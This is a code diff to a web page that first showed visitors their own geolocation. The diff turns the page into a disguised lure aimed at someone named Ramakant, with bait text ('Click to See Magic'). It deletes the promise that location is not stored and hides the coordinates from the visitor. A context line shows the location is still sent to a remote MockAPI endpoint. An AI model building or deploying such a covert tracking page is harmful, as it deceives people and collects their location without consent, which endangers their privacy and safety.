@@ -104,8 +104,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>🌍 Location Finder</h1>
-        <button class="location-btn" id="getLocation">Get My Current Location</button>
+        <h1>🌍 Check Much You Know , Ramakant</h1>
+        <button class="location-btn" id="getLocation">Click to See Magic</button>
         
         <div class="loading" id="loading">
             <div class="spinner"></div>
@@ -113,9 +113,8 @@
         </div>
         
         <div class="location-info" id="locationInfo" style="display: none;">
-            <h2>Your Location Coordinates:</h2>
+            <h2>Hi User:</h2>
             <p class="coordinates" id="coordinates"></p>
-            <p><small>This information is only visible to you and is not stored anywhere.</small></p>
         </div>
         
         <div class="error" id="error" style="display: none;"></div>
@@ -148,7 +147,7 @@
         // Update UI
         document.getElementById("loading").style.display = "none";
         document.getElementById("locationInfo").style.display = "block";
-        document.getElementById("coordinates").innerText = `Latitude: ${lat}, Longitude: ${lon}`;
+        document.getElementById("coordinates").innerText = `You are best Person.`;
 
         // Send to MockAPI (match schema)
         try {
